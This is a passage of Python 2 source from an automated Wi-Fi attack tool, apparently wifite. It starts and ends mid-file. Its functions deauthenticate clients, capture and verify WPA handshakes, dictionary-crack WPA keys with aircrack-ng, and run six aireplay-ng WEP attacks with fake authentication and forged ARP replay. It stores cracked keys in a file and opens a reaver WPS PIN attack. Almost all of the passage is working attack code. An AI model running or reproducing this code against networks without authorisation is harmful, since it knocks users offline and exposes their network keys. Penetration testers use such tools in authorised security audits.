					if client_index == -1 or len(target_clients) == 0 or client_index >= len(target_clients):
						print " %s sending 1 deauth to %s*broadcast*%s..." % \
							 (self.GR+self.sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running)+self.W, self.G, self.W),
						client_index = -1
					else:
						print " %s sending 1 deauth to %s... " % \
							 (self.GR+self.sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running)+self.W, \
							 self.G+target_clients[client_index].bssid+self.W),
						cmd.append('-h')
						cmd.append(target_clients[client_index].bssid)
					cmd.append(iface)
					stdout.flush()

					# Send deauth packets via aireplay, wait for them to complete.
					proc_deauth = Popen(cmd, stdout=self.DN, stderr=self.DN)
					proc_deauth.wait()
					print "sent\r",
					stdout.flush()

				# Copy current dump file for consistency
				if not os.path.exists(self.temp + 'wpa-01.cap'): continue
				copy(self.temp + 'wpa-01.cap', self.temp + 'wpa-01.cap.temp')

				# Save copy of cap file (for debugging)
				#remove_file('/root/new/wpa-01.cap')
				#copy(self.temp + 'wpa-01.cap', '/root/new/wpa-01.cap')

				# Check for handshake
				if self.has_handshake(target, self.temp + 'wpa-01.cap.temp'):
					got_handshake = True

					try: os.mkdir(self.WPA_HANDSHAKE_DIR + os.sep)
					except OSError: pass

					# Kill the airodump and aireplay processes
					self.send_interrupt(proc_read)
					self.send_interrupt(proc_deauth)

					# Save a copy of the handshake
					self.rename(self.temp + 'wpa-01.cap.temp', save_as)

					print '\n %s %shandshake captured%s! saved as "%s"' % \
						  (self.GR+self.sec_to_hms(seconds_running)+self.W, self.G, self.W, self.G+save_as+self.W)
					self.WPA_FINDINGS.append('%s (%s) handshake captured' % (target.ssid, target.bssid))
					self.WPA_FINDINGS.append('saved as %s' % (save_as))
					self.WPA_FINDINGS.append('')

					# Strip handshake if needed
					if self.WPA_STRIP_HANDSHAKE: self.strip_handshake(save_as)

					# Add the filename and SSID to the list of 'to-crack'
					# Cracking will be handled after all attacks are finished.
					self.WPA_CAPS_TO_CRACK.append(CapFile(save_as, target.ssid, target.bssid))

					break # Break out of while loop

				# No handshake yet
				os.remove(self.temp + 'wpa-01.cap.temp')

				# Check the airodump output file for new clients
				for client in self.parse_csv(self.temp + 'wpa-01.csv')[1]:
					if client.station != target.bssid: continue
					new_client = True
					for c in target_clients:
						if client.bssid == c.bssid:
							new_client = False
							break

					if new_client:
						print " %s %snew client%s found: %s                         " % \
						   (self.GR+self.sec_to_hms(self.WPA_ATTACK_TIMEOUT - seconds_running)+self.W, self.G, self.W, \
						   self.G+client.bssid+self.W)
						target_clients.append(client)

			# End of Handshake wait loop.
			if not got_handshake:
				print self.R+' [0:00:00]'+self.O+' unable to capture handshake in time'+self.W

		except KeyboardInterrupt:
			print self.R+'\n (^C)'+self.O+' WPA handshake capture interrupted'+self.W
			if self.attack_interrupted_prompt():
				self.remove_airodump_files(self.temp + 'wpa')
				self.send_interrupt(proc_read)
				self.send_interrupt(proc_deauth)
				print ''
				self.exit_gracefully(0)

		# clean up
		self.remove_airodump_files(self.temp + 'wpa')
		self.send_interrupt(proc_read)
		self.send_interrupt(proc_deauth)

		return got_handshake

	def has_handshake_tshark(self, target, capfile):
		"""
		Uses TShark to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
		"""

		if self.program_exists('tshark'):
			# Call Tshark to return list of EAPOL packets in cap file.
			cmd = ['tshark',
			   '-r', capfile, # Input file
			   '-R', 'eapol', # Filter (only EAPOL packets)
			   '-n']          # Do not resolve names (MAC vendors)
			proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
			proc.wait()
			lines = proc.communicate()[0].split('\n')

			# Get list of all clients in cap file
			clients = []
			for line in lines:
				if line.find('appears to have been cut short') != -1 or \
								line.find('Running as user "root"') != -1 or \
								line.strip() == '':
					continue

				while line.startswith(' '):  line = line[1:]
				while line.find('  ') != -1: line = line.replace('  ', ' ')

				fields = line.split(' ')
				src = fields[2].lower()
				dst = fields[4].lower()

				if src == target.bssid.lower() and clients.count(dst) == 0: clients.append(dst)
				elif dst == target.bssid.lower() and clients.count(src) == 0: clients.append(src)

			# Check each client for a handshake
			for client in clients:
				msg_num = 1 # Index of message in 4-way handshake (starts at 1)

				for line in lines:
					if line.find('appears to have been cut short') != -1: continue
					if line.find('Running as user "root"') != -1: continue
					if line.strip() == '': continue

					# Sanitize tshark's output, separate into fields
					while line[0] == ' ': line = line[1:]
					while line.find('  ') != -1: line = line.replace('  ', ' ')

					fields = line.split(' ')

					# Sometimes tshark doesn't display the full header for "Key (msg 3/4)" on the 3rd handshake.
					# This catches this glitch and fixes it.
					if len(fields) < 8:
						continue
					elif len(fields) == 8:
						fields.append('(msg')
						fields.append('3/4)')

					src = fields[2].lower() # Source MAC address
					dst = fields[4].lower() # Destination MAC address
					#msg = fields[9][0]      # The message number (1, 2, 3, or 4)
					msg = fields[-1][0]

					# First, third msgs in 4-way handshake are from the target to client
					if msg_num % 2 == 1 and (src != target.bssid.lower() or dst != client): continue
					# Second, fourth msgs in 4-way handshake are from client to target
					elif msg_num % 2 == 0 and (dst != target.bssid.lower() or src != client): continue

					# The messages must appear in sequential order.
					try:
						if int(msg) != msg_num: continue
					except ValueError: continue

					msg_num += 1

					# We need the first 4 messages of the 4-way handshake
					# Although aircrack-ng cracks just fine with only 3 of the messages...
					if msg_num >= 4:
						return True
		return False

	def has_handshake_cowpatty(self, target, capfile, nonstrict=True):
		"""
		Uses cowpatty to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
		"""

		if not self.program_exists('cowpatty'): return False

		# Call cowpatty to check if capfile contains a valid handshake.
		cmd = ['cowpatty',
		   '-r', capfile,     # input file
		   '-s', target.ssid, # SSID
		   '-c']              # Check for handshake
		# Uses frames 1, 2, or 3 for key attack
		if nonstrict: cmd.append('-2')
		proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
		proc.wait()
		response = proc.communicate()[0]
		if response.find('incomplete four-way handshake exchange') != -1:
			return False
		elif response.find('Unsupported or unrecognized pcap file.') != -1:
			return False
		elif response.find('Unable to open capture file: Success') != -1:
			return False
		return True

	def has_handshake_pyrit(self, target, capfile):
		"""
		Uses pyrit to check for a handshake.
		Returns "True" if handshake is found, false otherwise.
		"""

		if not self.program_exists('pyrit'): return False

		# Call pyrit to "Analyze" the cap file's handshakes.
		cmd = ['pyrit',
		   '-r', capfile,
		   'analyze']
		proc = Popen(cmd, stdout=PIPE, stderr=self.DN)
		proc.wait()
		hit_essid = False
		for line in proc.communicate()[0].split('\n'):
			# Iterate over every line of output by Pyrit
			if line == '' or line == None: continue
			if line.find("AccessPoint") != -1:
				hit_essid = (line.find("('" + target.ssid + "')") != -1) and \
						(line.lower().find(target.bssid.lower()) != -1)
				#hit_essid = (line.lower().find(target.bssid.lower()))
			else:
				# If Pyrit says it's good or workable, it's a valid handshake.
				if hit_essid and (line.find(', good, ') != -1 or \
							  line.find(', workable, ') != -1):
								# or line.find(', bad, ') != -1):
					return True
		return False

	def has_handshake_aircrack(self, target, capfile):
		"""
		Uses aircrack-ng to check for handshake.
		Returns True if found, False otherwise.
		"""

		if not self.program_exists('aircrack-ng'): return False
		crack = 'echo "" | aircrack-ng -a 2 -w - -b ' + target.bssid + ' ' + capfile
		proc_crack = Popen(crack, stdout=PIPE, stderr=self.DN, shell=True)
		proc_crack.wait()
		txt = proc_crack.communicate()[0]

		return (txt.find('Passphrase not in dictionary') != -1)

	def has_handshake(self, target, capfile):
		"""
		Checks if .cap file contains a handshake.
		Returns True if handshake is found, False otherwise.
		"""

		valid_handshake = True
		tried = False
		if self.WPA_HANDSHAKE_TSHARK:
			tried = True
			valid_handshake = self.has_handshake_tshark(target, capfile)

		if valid_handshake and self.WPA_HANDSHAKE_COWPATTY:
			tried = True
			valid_handshake = self.has_handshake_cowpatty(target, capfile)

		# Use CowPatty to check for handshake.
		if valid_handshake and self.WPA_HANDSHAKE_COWPATTY:
			tried = True
			valid_handshake = self.has_handshake_cowpatty(target, capfile)

		# Check for handshake using Pyrit if applicable
		if valid_handshake and self.WPA_HANDSHAKE_PYRIT:
			tried = True
			valid_handshake = self.has_handshake_pyrit(target, capfile)

		# Check for handshake using aircrack-ng
		if valid_handshake and self.WPA_HANDSHAKE_AIRCRACK:
			tried = True
			valid_handshake = self.has_handshake_aircrack(target, capfile)

		if tried: return valid_handshake
		print self.R+' [!]'+self.O+' unable to check for handshake: all handshake options are disabled!'
		self.exit_gracefully(1)

	def strip_handshake(self, capfile):
		"""
		Uses Tshark or Pyrit to strip all non-handshake packets from a .cap file
		File in location 'capfile' is overwritten!
		"""

		output_file = capfile
		if self.program_exists('pyrit'):
			cmd = ['pyrit',
				'-r', capfile,
				'-o', output_file,
				'strip']
			call(cmd,stdout=self.DN, stderr=self.DN)

		elif self.program_exists('tshark'):
			# strip results with tshark
			cmd = ['tshark',
			   '-r', capfile,      # input file
			   '-R', 'eapol || wlan_mgt.tag.interpretation', # filter
			   '-w', capfile + '.temp'] # output file
			proc_strip = call(cmd, stdout=self.DN, stderr=self.DN)

			self.rename(capfile + '.temp', output_file)

		else:
			print self.R+" [!]"+self.O+" unable to strip .cap file: neither pyrit nor tshark were found"+self.W

	def save_cracked(self, bssid, ssid, key, encryption):
		"""
		Saves cracked access point key and info to a file.
		"""

		sep = chr(0)
		fout = open('cracked.txt', 'a')
		fout.write(bssid + sep + ssid + sep + key + sep + encryption + '\n')
		fout.flush()
		fout.close()


	def load_cracked(self):
		"""
		Loads info about cracked access points into list, returns list.
		"""

		result = []
		if not os.path.exists('cracked.txt'): return result
		fin = open('cracked.txt', 'r')
		lines = fin.read().split('\n')
		fin.close()

		for line in lines:
			fields = line.split(chr(0))
			if len(fields) <= 3: continue
			tar = Target(fields[0], '', '', '', fields[3], fields[1])
			tar.key = fields[2]
			result.append(tar)
		return result

	##########################
	# WPA CRACKING FUNCTIONS #
	##########################

	def wpa_crack(self, capfile):
		"""
		Cracks cap file using aircrack-ng
		This is crude and slow. If people want to crack using pyrit or cowpatty or oclhashcat,
		they can do so manually.
		"""

		if self.WPA_DICTIONARY == '':
			print self.R+' [!]'+self.O+' no WPA dictionary found! use -dict <file> command-line argument'+self.W
			return False

		print self.GR+' [0:00:00]'+self.W+' cracking %s with %s' % \
			  (self.G+capfile.ssid+self.W, self.G+'aircrack-ng'+self.W)
		start_time = time.time()
		cracked = False

		self.remove_file(self.temp + 'out.out')
		self.remove_file(self.temp + 'wpakey.txt')

		cmd = ['aircrack-ng',
		   '-a', '2',                 # WPA crack
		   '-w', self.WPA_DICTIONARY,      # Wordlist
		   '-l', self.temp + 'wpakey.txt', # Save key to file
		   '-b', capfile.bssid,       # BSSID of target
		   capfile.filename]

		proc = Popen(cmd, stdout=open(self.temp + 'out.out', 'a'), stderr=self.DN)
		try:
			kt  = 0 # Keys tested
			kps = 0 # Keys per second
			while True:
				time.sleep(1)

				if proc.poll() != None: # aircrack stopped
					if os.path.exists(self.temp + 'wpakey.txt'):
						# Cracked
						inf = open(self.temp + 'wpakey.txt')
						key = inf.read().strip()
						inf.close()
						self.WPA_FINDINGS.append('cracked wpa key for "%s" (%s): "%s"' %
												 (self.G+capfile.ssid+self.W,
												  self.G+capfile.bssid+self.W, self.C+key+self.W))
						self.WPA_FINDINGS.append('')

						self.save_cracked(capfile.bssid, capfile.ssid, key, 'WPA')

						print self.GR+'\n [+]'+self.W+' cracked %s (%s)!' % \
							  (self.G+capfile.ssid+self.W, self.G+capfile.bssid+self.W)
						print self.GR+' [+]'+self.W+' key:    "%s"\n' % (self.C+key+self.W)
						cracked = True
					else:
						# Did not crack
						print self.R+'\n [!]'+self.R+'crack attempt failed'+self.O+': passphrase not in dictionary'+self.W
					break

				inf = open(self.temp + 'out.out', 'r')
				lines = inf.read().split('\n')
				inf.close()
				outf = open(self.temp + 'out.out', 'w')
				outf.close()
				for line in lines:
					i = line.find(']')
					j = line.find('keys tested', i)
					if i != -1 and j != -1:
						kts = line[i+2:j-1]
						try: kt = int(kts)
						except ValueError: pass
					i = line.find('(')
					j = line.find('k/s)', i)
					if i != -1 and j != -1:
						kpss = line[i+1:j-1]
						try: kps = float(kpss)
						except ValueError: pass

				print "\r %s %s keys tested (%s%.2f keys/sec%s)   " % \
				   (self.GR+self.sec_to_hms(time.time() - start_time)+self.W,
					self.G+self.add_commas(kt)+self.W, self.G, kps, self.W),
				stdout.flush()

		except KeyboardInterrupt: print self.R+'\n (^C)'+self.O+' WPA cracking interrupted'+self.W

		self.send_interrupt(proc)
		try: os.kill(proc.pid, SIGTERM)
		except OSError: pass

		return cracked

	def add_commas(self, n):
		"""
		Receives integer n, returns string representation of n with commas in thousands place.
		I'm sure there's easier ways of doing this... but meh.
		"""

		strn = str(n)
		lenn = len(strn)
		i = 0
		result = ''
		while i < lenn:
			if (lenn - i) % 3 == 0 and i != 0: result += ','
			result += strn[i]
			i += 1
		return result

	#################
	# WEP FUNCTIONS #
	#################

	def attack_wep(self, iface, target, clients):
		"""
		Attacks WEP-encrypted network.
		Returns True if key was successfully found, False otherwise.
		"""

		if self.WEP_TIMEOUT <= 0: self.WEP_TIMEOUT = -1

		total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
		if not self.WEP_ARP_REPLAY: total_attacks -= 1
		if not self.WEP_CHOPCHOP:   total_attacks -= 1
		if not self.WEP_FRAGMENT:   total_attacks -= 1
		if not self.WEP_CAFFELATTE: total_attacks -= 1
		if not self.WEP_P0841:      total_attacks -= 1
		if not self.WEP_HIRTE:      total_attacks -= 1

		if total_attacks <= 0:
			print self.R+' [!]'+self.O+' unable to initiate WEP attacks: no attacks are selected!'
			return False
		remaining_attacks = total_attacks

		print ' %s preparing attack "%s" (%s)' % \
			   (self.GR+self.sec_to_hms(self.WEP_TIMEOUT)+self.W,
				self.G+target.ssid+self.W, self.G+self.target.bssid+self.W)

		interrupted_count = 0

		self.remove_airodump_files(self.temp + 'wep')
		self.remove_file(self.temp + 'wepkey.txt')

		# Start airodump process to capture packets
		cmd_airodump = ['airodump-ng',
		   '-w', self.temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
		   '-c', target.channel,    # Wireless channel
		   '--bssid', target.bssid,
		   iface]
		proc_airodump = Popen(cmd_airodump, stdout=self.DN, stderr=self.DN)
		proc_aireplay = None
		proc_aircrack = None

		successful       = False # Flag for when attack is successful
		started_cracking = False # Flag for when we have started aircrack-ng
		client_mac       = ''    # The client mac we will send packets to/from

		total_ivs = 0
		ivs = 0
		last_ivs = 0
		for attack_num in xrange(0, 6):
			# Skip disabled attacks
			if   attack_num == 0 and not self.WEP_ARP_REPLAY: continue
			elif attack_num == 1 and not self.WEP_CHOPCHOP:   continue
			elif attack_num == 2 and not self.WEP_FRAGMENT:   continue
			elif attack_num == 3 and not self.WEP_CAFFELATTE: continue
			elif attack_num == 4 and not self.WEP_P0841:      continue
			elif attack_num == 5 and not self.WEP_HIRTE:      continue

			remaining_attacks -= 1

			try:
				if self.wep_fake_auth(iface, target, self.sec_to_hms(self.WEP_TIMEOUT)):
					# Successful fake auth
					client_mac = self.THIS_MAC
				elif not self.WEP_IGNORE_FAKEAUTH:
					self.send_interrupt(proc_aireplay)
					self.send_interrupt(proc_airodump)
					print self.R+' [!]'+self.O+' unable to fake-authenticate with target'
					print self.R+' [!]'+self.O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
					return False

				self.remove_file(self.temp + 'arp.cap')
				# Generate the aireplay-ng arguments based on attack_num and other params
				cmd = self.get_aireplay_command(iface, attack_num, target, clients, client_mac)
				if cmd == '': continue
				proc_aireplay = Popen(cmd, stdout=self.DN, stderr=self.DN)

				print '\r %s attacking "%s" via' % \
					  (self.GR+self.sec_to_hms(self.WEP_TIMEOUT)+self.W, self.G+target.ssid+self.W),
				if attack_num == 0:   print self.G+'arp-replay',
				elif attack_num == 1: print self.G+'chop-chop',
				elif attack_num == 2: print self.G+'fragmentation',
				elif attack_num == 3: print self.G+'caffe-latte',
				elif attack_num == 4: print self.G+'p0841',
				elif attack_num == 5: print self.G+'hirte',
				print 'attack'+self.W

				print ' %s captured %s%d%s ivs @ %s iv/sec' % \
					  (self.GR+self.sec_to_hms(self.WEP_TIMEOUT)+self.W, self.G, total_ivs, self.W, self.G+'0'+self.W),
				stdout.flush()

				time.sleep(1)
				if attack_num == 1:
					# Send a deauth packet to broadcast and all clients *just because!*
					self.wep_send_deauths(iface, target, clients)
				last_deauth = time.time()

				replaying = False
				time_started = time.time()
				while time.time() - time_started < self.WEP_TIMEOUT:
					# time.sleep(5)
					for time_count in xrange(0, 6):
						if self.WEP_TIMEOUT == -1:
							current_hms = "[endless]"
						else:
							current_hms = self.sec_to_hms(self.WEP_TIMEOUT - (time.time() - time_started))
						print "\r %s\r" % (self.GR+current_hms+self.W),
						stdout.flush()
						time.sleep(1)

					# Calculates total seconds remaining

					# Check number of IVs captured
					csv = self.parse_csv(self.temp + 'wep-01.csv')[0]
					if len(csv) > 0:
						ivs = int(csv[0].data)
						print "\r                                                   ",
						print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
							  (self.GR+current_hms+self.W, self.G, total_ivs + ivs,
							   self.W, self.G, (ivs - last_ivs) / 5, self.W),

						if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
							print "\r %s deauthing to generate packets..." % (self.GR+current_hms+self.W),
							self.wep_send_deauths(iface, target, clients)
							print "done\r",
							last_deauth = time.time()

						last_ivs = ivs
						stdout.flush()
						if total_ivs + ivs >= self.WEP_CRACK_AT_IVS and not started_cracking:
							# Start cracking
							cmd = ['aircrack-ng',
							   '-a', '1',
							   '-l', self.temp + 'wepkey.txt']
							   #self.temp + 'wep-01.cap']
							# Append all .cap files in self.temp directory (in case we are resuming)
							for file in os.listdir(self.temp):
								if file.startswith('wep-') and file.endswith('.cap'):
									cmd.append(self.temp + file)

							print "\r %s started %s (%sover %d ivs%s)" % \
								  (self.GR+current_hms+self.W, self.G+'cracking'+self.W, self.G,
								   self.WEP_CRACK_AT_IVS, self.W)
							proc_aircrack = Popen(cmd, stdout=self.DN, stderr=self.DN)
							started_cracking = True

					# Check if key has been cracked yet.
					if os.path.exists(self.temp + 'wepkey.txt'):
						# Cracked!
						infile = open(self.temp + 'wepkey.txt', 'r')
						key = infile.read().replace('\n', '')
						infile.close()
						print '\n\n %s %s %s (%s)! key: "%s"' % \
							  (current_hms, self.G+'cracked', target.ssid+self.W,
							   self.G+target.bssid+self.W, self.C+key+self.W)
						self.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
						self.WEP_FINDINGS.append('')

						self.save_cracked(target.bssid, target.ssid, key, 'WEP')

						# Kill processes
						self.send_interrupt(proc_airodump)
						self.send_interrupt(proc_aireplay)
						try: os.kill(proc_aireplay, SIGTERM)
						except: pass
						self.send_interrupt(proc_aircrack)
						# Remove files generated by airodump/aireplay/packetforce
						time.sleep(0.5)
						self.remove_airodump_files(self.temp + 'wep')
						self.remove_file(self.temp + 'wepkey.txt')
						return True

					# Check if aireplay is still executing
					if proc_aireplay.poll() == None:
						if replaying: print ', '+self.G+'replaying         \r'+self.W,
						elif attack_num == 1 or attack_num == 2: print ', waiting for packet    \r',
						stdout.flush()
						continue

					# At this point, aireplay has stopped
					if attack_num != 1 and attack_num != 2:
						print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % \
							  (self.R+current_hms, self.O, self.W)
						break # Break out of attack's While loop

					# Check for a .XOR file (we expect one when doing chopchop/fragmentation
					xor_file = ''
					for filename in sorted(os.listdir(self.temp)):
						if filename.lower().endswith('.xor'): xor_file = self.temp + filename
					if xor_file == '':
						print '\r %s attack failed: %sunable to generate keystream        %s' % \
							  (self.R+current_hms, self.O, self.W)
						break

					self.remove_file(self.temp + 'arp.cap')
					cmd = ['packetforge-ng',
						 '-0',
						 '-a', target.bssid,
						 '-h', client_mac,
						 '-k', '192.168.1.2',
						 '-l', '192.168.1.100',
						 '-y', xor_file,
						 '-w', self.temp + 'arp.cap',
						 iface]
					proc_pforge = Popen(cmd, stdout=PIPE, stderr=self.DN)
					proc_pforge.wait()
					forged_packet = proc_pforge.communicate()[0]
					self.remove_file(xor_file)
					if forged_packet == None: result = ''
					forged_packet = forged_packet.strip()
					if not forged_packet.find('Wrote packet'):
						print "\r %s attack failed: unable to forget ARP packet               %s" % \
							  (self.R+current_hms+self.O, self.W)
						break

					# We were able to forge a packet, so let's replay it via aireplay-ng
					cmd = ['aireplay-ng',
					   '--arpreplay',
					   '-b', target.bssid,
					   '-r', self.temp + 'arp.cap', # Used the forged ARP packet
					   '-F', # Select the first packet
					   iface]
					proc_aireplay = Popen(cmd, stdout=self.DN, stderr=self.DN)

					print '\r %s forged %s! %s...         ' % \
						  (self.GR+current_hms+self.W, self.G+'arp packet'+self.W, self.G+'replaying'+self.W)
					replaying = True

				# After the attacks, if we are already cracking, wait for the key to be found!
				while started_cracking: # ivs > WEP_CRACK_AT_IVS:
					time.sleep(5)
					# Check number of IVs captured
					csv = self.parse_csv(self.temp + 'wep-01.csv')[0]
					if len(csv) > 0:
						ivs = int(csv[0].data)
						print self.GR+" [endless]"+self.W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
											 (self.G, total_ivs + ivs, self.W, self.G, (ivs - last_ivs) / 5, self.W),
						last_ivs = ivs
						stdout.flush()

					# Check if key has been cracked yet.
					if os.path.exists(self.temp + 'wepkey.txt'):
						# Cracked!
						infile = open(self.temp + 'wepkey.txt', 'r')
						key = infile.read().replace('\n', '')
						infile.close()
						print self.GR+'\n\n [endless] %s %s (%s)! key: "%s"' % \
							  (self.G+'cracked', target.ssid+self.W, self.G+target.bssid+self.W, self.C+key+self.W)
						self.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (target.ssid, target.bssid, key))
						self.WEP_FINDINGS.append('')

						self.save_cracked(target.bssid, target.ssid, key, 'WEP')

						# Kill processes
						self.send_interrupt(proc_airodump)
						self.send_interrupt(proc_aireplay)
						self.send_interrupt(proc_aircrack)
						# Remove files generated by airodump/aireplay/packetforce
						self.remove_airodump_files(self.temp + 'wep')
						self.remove_file(self.temp + 'wepkey.txt')
						return True

			# Keyboard interrupt during attack
			except KeyboardInterrupt:
				print self.R+'\n (^C)'+self.O+' WEP attack interrupted\n'+self.W

				self.send_interrupt(proc_airodump)
				if proc_aireplay != None:
					self.send_interrupt(proc_aireplay)
				if proc_aircrack != None:
					self.send_interrupt(proc_aircrack)

				options = []
				selections = []
				if remaining_attacks > 0:
					options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
										(self.G, self.W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
					selections.append(self.G+'c'+self.W)

				if self.TARGETS_REMAINING > 0:
					options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
										(self.O, self.W, self.TARGETS_REMAINING, 's' if self.TARGETS_REMAINING != 1 else ''))
					selections.append(self.O+'s'+self.W)

				options.append('%sexit%s     the program completely' % (self.R, self.W))
				selections.append(self.R+'e'+self.W)

				if len(options) > 1:
					# Ask user what they want to do, Store answer in "response"
					print self.GR+' [+]'+self.W+' what do you want to do?'
					response = ''
					while response != 'c' and response != 's' and response != 'e':
						for option in options:
							print '     %s' % option
						response = raw_input(self.GR+' [+]'+self.W+' please make a selection (%s): ' %
											 (', '.join(selections))).lower()[0]
				else:
					response = 'e'

				if response == 'e' or response == 's':
					# Exit or skip target (either way, stop this attack)
					if self.WEP_SAVE:
						# Save packets
						save_as = re.sub(r'[^a-zA-Z0-9]', '', target.ssid) + '_' + target.bssid.replace(':', '-') + '.cap'+self.W
						try:            self.rename(self.temp + 'wep-01.cap', save_as)
						except OSError: print self.R+' [!]'+self.O+' unable to save capture file!'+self.W
						else:           print self.GR+' [+]'+self.W+' packet capture '+self.G+'saved'+self.W+' to '+self.G+save_as+self.W

					# Remove files generated by airodump/aireplay/packetforce
					for filename in os.listdir('.'):
						if filename.startswith('replay_arp-') and filename.endswith('.cap'):
							self.remove_file(filename)
					self.remove_airodump_files(self.temp + 'wep')
					self.remove_file(self.temp + 'wepkey.txt')
					print ''
					if response == 'e':
						self.exit_gracefully(0)
					return

				elif response == 'c':
					# Continue attacks
					# Need to backup temp/wep-01.cap and remove airodump files
					i = 2
					while os.path.exists(self.temp + 'wep-' + str(i) + '.cap'):
						i += 1
					copy(self.temp + "wep-01.cap", self.temp + 'wep-' + str(i) + '.cap')
					self.remove_airodump_files(self.temp + 'wep')

					# Need to restart airodump-ng, as it's been interrupted/killed
					proc_airodump = Popen(cmd_airodump, stdout=self.DN, stderr=self.DN)

					# Say we haven't started cracking yet, so we re-start if needed.
					started_cracking = False

					# Reset IVs counters for proper behavior
					total_ivs += ivs
					ivs = 0
					last_ivs = 0

					# Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
					pass

		if successful:
			print self.GR+'\n [0:00:00]'+self.W+' attack complete: '+self.G+'success!'+self.W
		else:
			print self.GR+'\n [0:00:00]'+self.W+' attack complete: '+self.R+'failure'+self.W

		self.send_interrupt(proc_airodump)
		if proc_aireplay != None:
			self.send_interrupt(proc_aireplay)

		# Remove files generated by airodump/aireplay/packetforce
		for filename in os.listdir('.'):
			if filename.startswith('replay_arp-') and filename.endswith('.cap'):
				self.remove_file(filename)
		self.remove_airodump_files(self.temp + 'wep')
		self.remove_file(self.temp + 'wepkey.txt')

	def wep_fake_auth(self, iface, target, time_to_display):
		"""
		Attempt to (falsely) authenticate with a WEP access point.
		Gives 3 seconds to make each 5 authentication attempts.
		Returns True if authentication was successful, False otherwise.
		"""

		max_wait = 3 # Time, in seconds, to allow each fake authentication
		max_attempts = 5 # Number of attempts to make

		for fa_index in xrange(1, max_attempts + 1):
			print '\r                                                            ',
			print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
			   (self.GR+time_to_display+self.W, self.G, self.W, fa_index, max_attempts),
			stdout.flush()

			cmd = ['aireplay-ng',
			   '-1', '0', # Fake auth, no delay
			   '-a', target.bssid,
			   '-T', '1'] # Make 1 attempt
			if target.ssid != '':
				cmd.append('-e')
				cmd.append(target.ssid)
			cmd.append(iface)

			proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=self.DN)
			started = time.time()
			while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
			if time.time() - started > max_wait:
				self.send_interrupt(proc_fakeauth)
				print self.R+'failed'+self.W,
				stdout.flush()
				time.sleep(0.5)
				continue

			result = proc_fakeauth.communicate()[0].lower()
			if result.find('switching to shared key') != -1 or \
				result.find('rejects open system'): pass
				# TODO Shared Key Authentication (SKA)
			if result.find('association successful') != -1:
				print self.G+'success!'+self.W
				return True

			print self.R+'failed'+self.W,
			stdout.flush()
			time.sleep(0.5)
			continue
		print ''
		return False

	def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):
		"""
		Returns aireplay-ng command line arguments based on parameters.
		"""

		cmd = ''
		if attack_num == 0:
			cmd = ['aireplay-ng',
			   '--arpreplay',
			   '-b', target.bssid,
			   '-x', str(self.WEP_PPS)] # Packets per second
			if client_mac != '':
				cmd.append('-h')
				cmd.append(client_mac)
			elif len(clients) > 0:
				cmd.append('-h')
				cmd.append(clients[0].bssid)
			cmd.append(iface)

		elif attack_num == 1:
			cmd = ['aireplay-ng',
			   '--chopchop',
			   '-b', target.bssid,
			   '-x', str(self.WEP_PPS), # Packets per second
			   '-m', '60', # Minimum packet length (bytes)
			   '-n', '82', # Maxmimum packet length
			   '-F'] # Automatically choose the first packet
			if client_mac != '':
				cmd.append('-h')
				cmd.append(client_mac)
			elif len(clients) > 0:
				cmd.append('-h')
				cmd.append(clients[0].bssid)
			cmd.append(iface)

		elif attack_num == 2:
			cmd = ['aireplay-ng',
			   '--fragment',
			   '-b', target.bssid,
			   '-x', str(self.WEP_PPS), # Packets per second
			   '-m', '100', # Minimum packet length (bytes)
			   '-F'] # Automatically choose the first packet
			if client_mac != '':
				cmd.append('-h')
				cmd.append(client_mac)
			elif len(clients) > 0:
				cmd.append('-h')
				cmd.append(clients[0].bssid)
			cmd.append(iface)

		elif attack_num == 3:
			cmd = ['aireplay-ng',
			   '--caffe-latte',
			   '-b', target.bssid]
			if len(clients) > 0:
				cmd.append('-h')
				cmd.append(clients[0].bssid)
			cmd.append(iface)

		elif attack_num == 4:
			cmd = ['aireplay-ng',
			   '--interactive',
			   '-b', target.bssid,
			   '-c', 'ff:ff:ff:ff:ff:ff',
			   '-t', '1', # Only select packets with ToDS bit set
			   '-x', str(self.WEP_PPS), # Packets per second
			   '-F',      # Automatically choose the first packet
			   '-p', '0841']
			cmd.append(iface)

		elif attack_num == 5:
			if len(clients) == 0:
				print self.R+' [0:00:00] unable to carry out hirte attack: '+self.O+'no clients'
				return ''
			cmd = ['aireplay-ng',
			   '--cfrag',
			   '-h', clients[0].bssid,
			   iface]

		return cmd

	def wep_send_deauths(self, iface, target, clients):
		"""
		Sends deauth packets to broadcast and every client.
		"""
		# Send deauth to broadcast
		cmd = ['aireplay-ng',
		   '--deauth', '1',
		   '-a', target.bssid,
		   iface]
		call(cmd, stdout=self.DN, stderr=self.DN)
		# Send deauth to every client
		for client in clients:
			cmd = ['aireplay-ng',
				 '--deauth', '1',
				 '-a', target.bssid,
				 '-h', client.bssid,
				 iface]
			call(cmd, stdout=self.DN, stderr=self.DN)

	#################
	# WPS FUNCTIONS #
	#################

	def wps_attack(self, iface, target):
		"""
		Mounts attack against target on iface.
		Uses "reaver" to attempt to brute force the PIN.
		Once PIN is found, PSK can be recovered.
		PSK is displayed to user and added to WPS_FINDINGS
		"""

		print self.GR+' [0:00:00]'+self.W+' initializing %sWPS PIN attack%s on %s' % \
				 (self.G, self.W, self.G+target.ssid+self.W+' ('+self.G+target.bssid+self.W+')'+self.W)

		cmd = ['reaver',
		   '-i', iface,
